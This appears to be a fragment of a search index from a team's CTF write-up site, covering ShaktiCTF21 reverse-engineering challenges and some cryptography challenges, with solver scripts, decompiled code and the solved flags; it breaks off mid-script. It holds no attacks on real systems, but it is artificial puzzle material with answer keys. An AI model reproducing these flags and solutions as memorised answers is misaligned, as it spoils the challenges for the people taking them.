[165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag) Flag shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Margaret"},{"location":"ShaktiCTF21/reversing/Margaret/#author","text":"Simran Sandra","title":"Author"},{"location":"ShaktiCTF21/reversing/Margaret/#challenge-short-writeup","text":"The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver.","title":"Challenge Short Writeup"},{"location":"ShaktiCTF21/reversing/Margaret/#solver","text":"result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag)","title":"Solver"},{"location":"ShaktiCTF21/reversing/Margaret/#flag","text":"shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Flag"},{"location":"ShaktiCTF21/reversing/bomb/","text":"BomB Challenge Author :bl4ck_Widw Points :200 Description flag format : shaktiCTF{S0m3_stR1nG} WriteUp This a basic C++ challenge which uses xoring to form the flag from the input .While running the program , we can see that the binary asks for a pin code. Going in deep into the program , we can see that there is a comparison of the input length with 9 . Further , when you move through the rest of the code , we can see that the input pin code gets xored with a string: '\\x10\\x13\\x17m\\x17\\x13\\x03' its output again gets xored with an array : [85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] This finally gives us the output, which if passes the constrains given, provides us with the flag . As the challenge discription tells us about the flag format , we can use it as a clue in solving our problem. As we know , the flag format is shaktiCTF{} . ShaktiCTF is a 9 letter long string just like our input . Hence we can use the flag format to reverse our program and find the pin . Solution script: d=\"shaktiCTF\" # The flag format can be used to find the pin code c=[85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] xored1 = [] for i in range(len(d)): xor=chr(ord(d[i%len(d)]) ^ c[i]) xored1.append(xor) a=[0x10, 0x13, 0x17, 0x6d, 0x17, 0x13, 0x3, 0x0,0x4b,0x3,0x1,0x2,0x5, 0x7] xored4 = [] print(\"PIN: \") for i in range(0,9): Output=chr(ord(xored1[i%len(xored1)]) ^ a[i]) xored4.append(Output) print(xored4) #pin :674332666 flag :shaktiCTF{TH3_BoMb_1$_D3AcTiV4t3D_gR34T_w0Rk!}","title":"BomB"},{"location":"ShaktiCTF21/reversing/bomb/#bomb","text":"","title":"BomB"},{"location":"ShaktiCTF21/reversing/bomb/#challenge-author-bl4ck_widw","text":"","title":"Challenge Author :bl4ck_Widw"},{"location":"ShaktiCTF21/reversing/bomb/#points-200","text":"","title":"Points :200"},{"location":"ShaktiCTF21/reversing/bomb/#description","text":"flag format : shaktiCTF{S0m3_stR1nG}","title":"Description"},{"location":"ShaktiCTF21/reversing/bomb/#writeup","text":"This a basic C++ challenge which uses xoring to form the flag from the input .While running the program , we can see that the binary asks for a pin code. Going in deep into the program , we can see that there is a comparison of the input length with 9 . Further , when you move through the rest of the code , we can see that the input pin code gets xored with a string: '\\x10\\x13\\x17m\\x17\\x13\\x03' its output again gets xored with an array : [85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] This finally gives us the output, which if passes the constrains given, provides us with the flag . As the challenge discription tells us about the flag format , we can use it as a clue in solving our problem. As we know , the flag format is shaktiCTF{} . ShaktiCTF is a 9 letter long string just like our input . Hence we can use the flag format to reverse our program and find the pin . Solution script: d=\"shaktiCTF\" # The flag format can be used to find the pin code c=[85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] xored1 = [] for i in range(len(d)): xor=chr(ord(d[i%len(d)]) ^ c[i]) xored1.append(xor) a=[0x10, 0x13, 0x17, 0x6d, 0x17, 0x13, 0x3, 0x0,0x4b,0x3,0x1,0x2,0x5, 0x7] xored4 = [] print(\"PIN: \") for i in range(0,9): Output=chr(ord(xored1[i%len(xored1)]) ^ a[i]) xored4.append(Output) print(xored4) #pin :674332666 flag :shaktiCTF{TH3_BoMb_1$_D3AcTiV4t3D_gR34T_w0Rk!}","title":"WriteUp"},{"location":"ShaktiCTF21/reversing/deceev/","text":"Deceev Challenge Writeup This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2] Flag shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#deceev","text":"","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#challenge-writeup","text":"This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2]","title":"Challenge Writeup"},{"location":"ShaktiCTF21/reversing/deceev/#flag","text":"shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Flag"},{"location":"ShaktiCTF21/reversing/fusk/","text":"Fusk Challenge Concept Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7) Flag flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#fusk","text":"","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#challenge-concept","text":"Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7)","title":"Challenge Concept"},{"location":"ShaktiCTF21/reversing/fusk/#flag","text":"flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Flag"},{"location":"ShaktiCTF21/reversing/hack/","text":"Hack Challenge Author: bl4ck_Widw Points : 50 Description Lets compare! Writeup This challenge is a fairly simple one but a bit tricky for beginners . The challenge emphasises on string compare . The input gets compared with a small part of an array already provided. The player just have to figure out which part gets compared with to find the flag. Solution script: #include<stdio.h> #include<string.h> #include<stdlib.h> int v2[30]={89,51,115,95,95,72,52,99,75,95,116,72,51,95,77,48,48,110,95,95,33,33,95,72}; int main(){ char v1[16]; int j; //shaktictf{__H4cK_tH3_M00n_} for(j=0;j<16;j++){ v1[j]=(char)v2[j+3]; } v1[j]='\\0'; printf(\"shaktictf{%s}\\n\",v1); } Flag:shaktictf{__H4cK_tH3_M00n_}","title":"Hack"},{"location":"ShaktiCTF21/reversing/hack/#hack","text":"","title":"Hack"},{"location":"ShaktiCTF21/reversing/hack/#challenge-author-bl4ck_widw","text":"","title":"Challenge Author: bl4ck_Widw"},{"location":"ShaktiCTF21/reversing/hack/#points-50","text":"","title":"Points : 50"},{"location":"ShaktiCTF21/reversing/hack/#description","text":"Lets compare!","title":"Description"},{"location":"ShaktiCTF21/reversing/hack/#writeup","text":"This challenge is a fairly simple one but a bit tricky for beginners . The challenge emphasises on string compare . The input gets compared with a small part of an array already provided. The player just have to figure out which part gets compared with to find the flag. Solution script: #include<stdio.h> #include<string.h> #include<stdlib.h> int v2[30]={89,51,115,95,95,72,52,99,75,95,116,72,51,95,77,48,48,110,95,95,33,33,95,72}; int main(){ char v1[16]; int j; //shaktictf{__H4cK_tH3_M00n_} for(j=0;j<16;j++){ v1[j]=(char)v2[j+3]; } v1[j]='\\0'; printf(\"shaktictf{%s}\\n\",v1); } Flag:shaktictf{__H4cK_tH3_M00n_}","title":"Writeup"},{"location":"ShaktiCTF21/reversing/intro/","text":"Reversing Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM BomB Medium bl4ck_Widw Xor Hack Easy bl4ck_Widw String compare pr0c3sses Medium imm0rt4l_5t4rk fork","title":"Reversing"},{"location":"ShaktiCTF21/reversing/intro/#reversing","text":"Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM BomB Medium bl4ck_Widw Xor Hack Easy bl4ck_Widw String compare pr0c3sses Medium imm0rt4l_5t4rk fork","title":"Reversing"},{"location":"ShaktiCTF21/reversing/process/","text":"pr0c3sses On running the challenge it requires to enter a string of length < 10. On opening up the binary we see a bunch of forks and compare statement with a string. The challenge is divided in two parts. The first part targets even indexes of the input and the second part targets the odd indexes. The goal is the choose such values from given switch cases as to get the string we get in the end to compare. Easiest and quickest way is to just create a fork tree. Total no. of processes = 2^(no. of times fork called) Let's take the first part. First check the no. of processes being called. This can be done by checking the no. of - in the compare statement, because each process on finishing is ended with a - . The no. of processes is 16. So we know the total no. of fork calls has to be 4. Looking in switch cases which prints out what is being compared later. Then make a fork tree. The parent is printed out last. Hence the last - in the compare statement is the parent. This is because of the wait(NULL) which makes the parent wait until all child processes are completed. Trace back the path to get the required inputs. Similarly do for the second part. Input given: 23144105 Flag: shaktictf{p4r3nt_ch1ld_Ch17d_wut?_0n3_m0r3!}","title":"pr0c3sses"},{"location":"ShaktiCTF21/reversing/process/#pr0c3sses","text":"On running the challenge it requires to enter a string of length < 10. On opening up the binary we see a bunch of forks and compare statement with a string. The challenge is divided in two parts. The first part targets even indexes of the input and the second part targets the odd indexes. The goal is the choose such values from given switch cases as to get the string we get in the end to compare. Easiest and quickest way is to just create a fork tree. Total no. of processes = 2^(no. of times fork called) Let's take the first part. First check the no. of processes being called. This can be done by checking the no. of - in the compare statement, because each process on finishing is ended with a - . The no. of processes is 16. So we know the total no. of fork calls has to be 4. Looking in switch cases which prints out what is being compared later. Then make a fork tree. The parent is printed out last. Hence the last - in the compare statement is the parent. This is because of the wait(NULL) which makes the parent wait until all child processes are completed. Trace back the path to get the required inputs. Similarly do for the second part. Input given: 23144105 Flag: shaktictf{p4r3nt_ch1ld_Ch17d_wut?_0n3_m0r3!}","title":"pr0c3sses"},{"location":"ShaktiCTF21/web/intro/","text":"","title":"Intro"},{"location":"crypto/intro/","text":"Cryptography Introduction \"The following repo contains writeups of challenges solved from CTFs by the memebers of Team Shakti\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani TamuCTF pwngen - ph03n1x ENCODING - Adhithya Sree Mohan ciphper - Adhithya Sree Mohan CyberApocalypseCTF phasestream3 - Pavani phase-stream4 - Sowmya soul-crabber - Sowmya soul-crabber2 - Sowmya little-nightmares - Sowmya wii-phit - Sowmya","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"The following repo contains writeups of challenges solved from CTFs by the memebers of Team Shakti\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani TamuCTF pwngen - ph03n1x ENCODING - Adhithya Sree Mohan ciphper - Adhithya Sree Mohan CyberApocalypseCTF phasestream3 - Pavani phase-stream4 - Sowmya soul-crabber - Sowmya soul-crabber2 - Sowmya little-nightmares - Sowmya wii-phit - Sowmya","title":"The contents of this repo"},{"location":"crypto/BlueHensCTF/OTP-1/","text":"OTP-1 Description Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly. Flag UDCTF{w3lcome_t0_0ur_ctf}","title":"OTP-1"},{"location":"crypto/BlueHensCTF/OTP-1/#otp-1","text":"","title":"OTP-1"},{"location":"crypto/BlueHensCTF/OTP-1/#description","text":"Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly.","title":"Description"},{"location":"crypto/BlueHensCTF/OTP-1/#flag","text":"UDCTF{w3lcome_t0_0ur_ctf}","title":"Flag"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/","text":"BlueHens CTF Hot-diggity-dog hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#hot-diggity-dog","text":"hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"Hot-diggity-dog"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/","text":"OTP-1 Description Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly. Flag= UDCTF{w3lcome_t0_0ur_ctf}","title":"OTP-1"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/#otp-1","text":"","title":"OTP-1"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/#description","text":"Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly.","title":"Description"},{"location":"crypto/BlueHensCTF/otp-1/OTP-1/#flag-udctfw3lcome_t0_0ur_ctf","text":"","title":"Flag= UDCTF{w3lcome_t0_0ur_ctf}"},{"location":"crypto/CyberApocalypseCTF/Little_Nightmares/","text":"Little Nightmares Solved by: Sowmya (@__4lph4__) Another interesting and number theory challenge from Cyber Apocalypse CTF 2021. Here is the challenge script: from Crypto.Util.number import getPrime, bytes_to_long from random import randint FLAG = b'CHTB{??????????????????????????????????}' flag = bytes_to_long(FLAG) def keygen(): p, q = getPrime(1024), getPrime(1024) N = p*q g, r1, r2 = [randint(1,N) for _ in range(3)] g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) return [N, g1, g2], [p, q] def encrypt(m, public): N, g1, g2 = public assert m < N, \"Message is too long\" s1, s2 = randint(1,N), randint(1,N) c1 = m*pow(g1,s1,N) % N c2 = m*pow(g2,s2,N) % N return [c1, c2] def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * pow(q, -1, p) * q m2 = c2 * pow(p, -1, q) * p return (m1 + m2) % (p*q) public, private = keygen() enc = encrypt(flag, public) assert flag == decrypt(enc, private) print(f'Public key: {public}') print(f'Encrypted Flag: {enc}') Output: Public key: [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] Encrypted Flag: [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] This is a customised encryption scheme with paramters N,g1,g2,c1,c2 given. On observing this line in the code: g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) We get to know that g1 \u2261 1 (mod p) and g2 \u2261 1 (mod q) . Using this we try to get out prime factors. Here's the solution script from Crypto.Util.number import * def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * inverse(q,p) * q m2 = c2 * inverse(p,q) * p return (m1 + m2) % (p*q) N,g1,g2 = [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] enc = [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 